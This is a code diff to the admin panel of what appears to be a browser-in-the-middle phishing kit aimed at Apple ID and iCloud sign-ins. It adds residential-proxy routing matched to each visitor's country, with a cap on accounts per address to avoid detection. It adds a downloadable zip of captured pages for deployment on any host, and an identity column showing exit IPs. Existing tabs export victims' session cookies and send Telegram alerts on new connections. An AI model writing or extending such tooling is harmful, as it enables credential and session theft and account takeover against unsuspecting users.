@@ -278,7 +278,7 @@
   /* ---------------------------------------------------------------- forms */
   label.field { display: block; margin-bottom: 16px; }
   label.field span { display: block; font-size: 12.5px; color: var(--muted); margin-bottom: 6px; }
-  input[type=text], input[type=password], input[type=number] {
+  input[type=text], input[type=password], input[type=number], select {
     width: 100%;
     background: var(--bg);
     border: 1px solid var(--line);
@@ -290,7 +290,7 @@
     outline: none;
     transition: border-color .15s ease, box-shadow .15s ease;
   }
-  input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(61,123,255,.16); }
+  input:focus, select:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(61,123,255,.16); }
   input::placeholder { color: #55607a; }
 
   .row { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
@@ -315,6 +315,9 @@
   button.action[disabled] { opacity: .55; cursor: not-allowed; }
 
   .switch { display: inline-flex; align-items: center; gap: 9px; color: var(--muted); font-size: 13.5px; }
+  /* A switch, or a note, with a field under it: the field needs a little
+     room of its own. */
+  label.switch + label.field, .note + label.field { margin-top: 18px; }
   .switch input { accent-color: var(--blue); width: 17px; height: 17px; }
 
   .note { font-size: 12.5px; color: var(--muted); margin-top: 10px; }
@@ -427,6 +430,8 @@
     <nav>
       <button data-tab="dashboard" class="on">Dashboard</button>
       <button data-tab="clients">Servers / Clients <span class="n" id="n-clients">0</span></button>
+      <button data-tab="proxy">Proxy</button>
+      <button data-tab="standalone">Standalone</button>
       <button data-tab="telegram">Telegram</button>
       <button data-tab="cookies">Cookies</button>
     </nav>
@@ -494,7 +499,7 @@
             <thead>
               <tr>
                 <th>Client</th><th>Status</th><th>Stage</th><th>Progress</th>
-                <th>Browser</th><th>Last activity</th><th>Cookies</th>
+                <th>Browser</th><th>Identity</th><th>Last activity</th><th>Cookies</th>
                 <th></th>
               </tr>
             </thead>
@@ -534,6 +539,143 @@
             in <span class="mono">.gitignore</span>, so it cannot be committed by
             accident. The token is never sent back to the page — only the first
             and last four characters are.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ----------------------------------------------------------- proxy -->
+    <section data-panel="proxy" class="hidden">
+      <div class="panel">
+        <div class="head">
+          <h3>The address the browsers leave from</h3>
+          <small>live &mdash; the next browser that opens uses it</small>
+        </div>
+        <div class="body">
+          <label class="switch">
+            <input type="checkbox" id="px-enabled">
+            Send every browser out through the proxy
+          </label>
+          <label class="field">
+            <span>Which proxy</span>
+            <select id="px-kind">
+              <option value="decodo">Decodo &mdash; residential backconnect</option>
+              <option value="generic">Another one &mdash; server, user, password</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>Server and port</span>
+            <input type="text" id="px-server" placeholder="gate.decodo.com:7000" autocomplete="off">
+          </label>
+          <label class="field">
+            <span>Protocol</span>
+            <select id="px-scheme">
+              <option value="socks5">SOCKS5 &mdash; the proxy resolves the names</option>
+              <option value="http">HTTP</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>User name</span>
+            <input type="text" id="px-user" placeholder="alice" autocomplete="off">
+          </label>
+          <label class="field">
+            <span>Password</span>
+            <input type="password" id="px-pass" placeholder="the password" autocomplete="off">
+          </label>
+          <label class="field">
+            <span>Country, when the visitor's own is not known</span>
+            <input type="text" id="px-country" placeholder="US" autocomplete="off">
+          </label>
+          <label class="field">
+            <span>How long a session is held, in minutes</span>
+            <input type="number" id="px-minutes" min="1" max="1440" value="120">
+          </label>
+          <label class="field">
+            <span>Accounts to one address</span>
+            <input type="number" id="px-max" min="1" max="50" value="3">
+          </label>
+          <div class="row" style="margin-top:18px">
+            <button class="action shrink" id="px-save">Save</button>
+            <button class="action ghost shrink" id="px-test">Check the address</button>
+          </div>
+          <div class="note" id="px-note"></div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="head"><h3>How it works</h3></div>
+        <div class="body">
+          <p class="note" style="margin-top:0">
+            Every browser that opens leaves from the address of the group it is
+            in, and a few visitors share an address &mdash; a household has two
+            Apple IDs, not forty. The country is the visitor's own, so the
+            browser and the address agree with each other.
+          </p>
+          <p class="note">
+            The change is live for the browsers that open after it. The ones
+            that are open keep the address they were opened with: a browser
+            cannot be moved to another address while it is running.
+          </p>
+          <p class="note">
+            The user name and the password are written to
+            <span class="mono">admin.json</span>, with the permissions of a
+            secret (0600), and the file is in
+            <span class="mono">.gitignore</span>. The password is never sent
+            back to the page &mdash; only whether there is one &mdash; so an
+            empty field means <em>keep the one that is there</em>.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ------------------------------------------------------- standalone -->
+    <section data-panel="standalone" class="hidden">
+      <div class="panel">
+        <div class="head">
+          <h3>A copy of the pages that lives anywhere</h3>
+          <small>the server stays where it is</small>
+        </div>
+        <div class="body">
+          <p class="note" style="margin-top:0">
+            The pages a visitor sees, and the engine that makes them live, as
+            a zip. Unpack it into the folder your host serves &mdash; a
+            cPanel, a bucket, anything &mdash; and the pages there will talk
+            to this server, which keeps the browsers, the sessions and the
+            sign-in.
+          </p>
+          <label class="field">
+            <span>Where this server is, from the outside</span>
+            <input type="text" id="sa-server" placeholder="https://icloud.example.com" autocomplete="off">
+          </label>
+          <div class="row" style="margin-top:16px">
+            <button class="action shrink" id="sa-save">Save the address</button>
+            <button class="action ghost shrink" id="sa-zip">Download the zip</button>
+          </div>
+          <div class="note" id="sa-note"></div>
+          <p class="note" id="sa-pages"></p>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="head"><h3>How to use it</h3></div>
+        <div class="body">
+          <p class="note" style="margin-top:0">
+            1. Unpack the zip into the folder your host serves &mdash; often
+            <span class="mono">public_html</span>, or a folder inside it.
+          </p>
+          <p class="note">
+            2. Open <span class="mono">client.html</span> through the address
+            of that folder. That is all: there is nothing to run there, only
+            pages.
+          </p>
+          <p class="note">
+            3. The pages have to be able to reach this server, and the server
+            has to be on <span class="mono">https</span> &mdash; a page on
+            https talking to a server on http is refused by the browser.
+          </p>
+          <p class="note">
+            The zip holds <span class="mono">client.html</span>, the captures
+            in <span class="mono">src/</span>, the engine beside them, and a
+            note. The captures are the same pages, with the same engine in
+            them: what the visitor sees is what they would have seen here.
           </p>
         </div>
       </div>
@@ -580,6 +722,8 @@
   var TITLES = {
     dashboard: ["Dashboard", "Everything the server knows, as it happens."],
     clients: ["Servers / Clients", "Whoever is here, and who has gone."],
+    proxy: ["Proxy", "The address the browsers leave from."],
+    standalone: ["Standalone", "A copy of the pages that can live anywhere."],
     telegram: ["Telegram", "A note when somebody new connects."],
     cookies: ["Cookies", "Your own session, in the format Cookie Editor reads."]
   };
@@ -704,6 +848,8 @@
     Array.prototype.forEach.call(document.querySelectorAll("section[data-panel]"), function (panel) {
       show(panel, panel.dataset.panel === name);
     });
+    if (name === "proxy") loadProxy();
+    if (name === "standalone") loadStandalone();
     if (name === "telegram") loadTelegram();
     if (name === "cookies") drawExports();
   }
@@ -756,6 +902,39 @@
         '<div class="sub">the profile is on disk</div>';
     }
     return '<span class="mono">—</span>';
+  }
+
+  /* The device this visitor's browser is, and the address it leaves from.
+   *
+   * The address is the thing that matters: it is the one that has to be
+   * the same all the way through a sign-in, and the one that must not be
+   * the machine's own. So it is shown, and whether it was checked is
+   * shown next to it - a client whose address could not be checked is a
+   * client the operator has to look at.
+   */
+  function identityCell(row) {
+    if (!row.group && !row.country) return '<span class="mono">—</span>';
+    var where = row.country ? escape(row.country) : "—";
+    if (row.group) where += " · " + escape(row.group);
+    var out = '<span class="mono">' + where + "</span>";
+    if (row.exit_ip) {
+      out += '<div class="sub mono">' + escape(row.exit_ip) + "</div>";
+      out += row.exit_ok
+        ? '<span class="pill ok">Checked</span>'
+        : '<span class="pill warn">Not checked</span>';
+      if (!row.exit_ok && row.exit_said) {
+        out += '<div class="err-line">' + escape(row.exit_said) + "</div>";
+      }
+    } else {
+      // No address at all is worth saying too: a browser that has not been
+      // checked is a browser the operator has to look at.
+      out += '<span class="pill warn">Not checked</span>';
+    }
+    if (row.device) {
+      out += '<div class="sub">' + escape(row.device) +
+        (row.locale ? " · " + escape(row.locale) : "") + "</div>";
+    }
+    return out;
   }
 
   function progress(row) {
@@ -894,6 +1073,7 @@
           "</td>" +
           '<td data-label="Progress">' + progress(row) + "</td>" +
           '<td data-label="Browser">' + browserCell(row) + "</td>" +
+          '<td data-label="Identity">' + identityCell(row) + "</td>" +
           '<td data-label="Last activity">' + escape(ago(row.idle_seconds)) + "</td>" +
           '<td data-label="Cookies">' + (row.export_allowed
             ? '<span class="pill warn">Allowed</span>'
@@ -1175,6 +1355,143 @@
       $("banner-button").style.display = err.status === 403 ? "" : "none";
     }
   }
+
+  /* ------------------------------------------------------------- proxy */
+
+  var proxyLoaded = false;
+
+  async function loadProxy() {
+    if (proxyLoaded) return;
+    try {
+      var settings = await api("/proxy");
+      $("px-enabled").checked = !!settings.enabled;
+      $("px-kind").value = settings.kind || "decodo";
+      $("px-server").value = settings.server || "";
+      $("px-scheme").value = settings.scheme || "socks5";
+      $("px-user").value = settings.username || "";
+      $("px-pass").placeholder = settings.password_set
+        ? "saved \u2014 type to replace"
+        : "the password";
+      $("px-country").value = settings.country || "US";
+      $("px-minutes").value = settings.session_minutes || 120;
+      $("px-max").value = settings.max_per_group || 3;
+      proxyLoaded = true;
+    } catch (err) {
+      $("px-note").className = "note bad";
+      $("px-note").textContent = err.message;
+    }
+  }
+
+  $("px-save").addEventListener("click", async function () {
+    var said = $("px-note");
+    said.className = "note";
+    said.textContent = "Saving\u2026";
+    try {
+      var body = {
+        enabled: $("px-enabled").checked,
+        kind: $("px-kind").value,
+        server: $("px-server").value.trim(),
+        scheme: $("px-scheme").value,
+        username: $("px-user").value.trim(),
+        country: $("px-country").value.trim().toUpperCase(),
+        session_minutes: parseInt($("px-minutes").value, 10) || 120,
+        max_per_group: parseInt($("px-max").value, 10) || 3,
+      };
+      // An empty password field means "keep the one that is there": the
+      // page is never sent the password, so it cannot send one back.
+      if ($("px-pass").value.trim()) body.password = $("px-pass").value.trim();
+      var settings = await api("/proxy", { method: "POST", body: body });
+      $("px-pass").value = "";
+      said.className = "note good";
+      said.textContent = settings.enabled
+        ? "Saved. The next browser that opens leaves from the proxy."
+        : "Saved. The browsers are leaving from this machine\u2019s own address.";
+      proxyLoaded = false;
+      loadProxy();
+    } catch (err) {
+      said.className = "note bad";
+      said.textContent = err.message;
+    }
+  });
+
+  $("px-test").addEventListener("click", async function () {
+    var said = $("px-note");
+    said.className = "note";
+    said.textContent = "Asking\u2026";
+    try {
+      var answer = await api("/proxy/test", {
+        method: "POST",
+        body: { country: $("px-country").value.trim().toUpperCase() || "US" },
+      });
+      if (!answer.ok) {
+        said.className = "note bad";
+        said.textContent = answer.said || "it did not answer";
+        return;
+      }
+      said.className = "note good";
+      said.textContent = "It leaves from " + answer.ip +
+        (answer.country ? " (" + answer.country + ")" : "");
+    } catch (err) {
+      said.className = "note bad";
+      said.textContent = err.message;
+    }
+  });
+
+  /* -------------------------------------------------------- standalone */
+
+  var standaloneLoaded = false;
+
+  async function loadStandalone() {
+    if (standaloneLoaded) return;
+    try {
+      var settings = await api("/standalone");
+      $("sa-server").value = settings.server || "";
+      $("sa-pages").textContent = settings.pages && settings.pages.length
+        ? "The zip holds: " + settings.pages.join(", ") +
+          (settings.engine ? ", and the engine." : ".")
+        : "There are no captures in src/ yet \u2014 the zip would be empty of pages.";
+      standaloneLoaded = true;
+    } catch (err) {
+      $("sa-note").className = "note bad";
+      $("sa-note").textContent = err.message;
+    }
+  }
+
+  $("sa-save").addEventListener("click", async function () {
+    var said = $("sa-note");
+    said.className = "note";
+    said.textContent = "Saving\u2026";
+    try {
+      await api("/standalone", {
+        method: "POST",
+        body: { server: $("sa-server").value.trim() },
+      });
+      said.className = "note good";
+      said.textContent = "Saved. The next zip will have that address in it.";
+      standaloneLoaded = false;
+      loadStandalone();
+    } catch (err) {
+      said.className = "note bad";
+      said.textContent = err.message;
+    }
+  });
+
+  $("sa-zip").addEventListener("click", function () {
+    // The address is saved first, so the zip has the one that is wanted
+    // in it rather than the one that was there.
+    $("sa-zip").disabled = true;
+    api("/standalone", {
+      method: "POST",
+      body: { server: $("sa-server").value.trim() },
+    }).then(function () {
+      window.location.href = "/admin/api/standalone/zip";
+    }).catch(function (err) {
+      $("sa-note").className = "note bad";
+      $("sa-note").textContent = err.message;
+    }).then(function () {
+      $("sa-zip").disabled = false;
+    });
+  });
 
   /* --------------------------------------------------------- telegram */
 
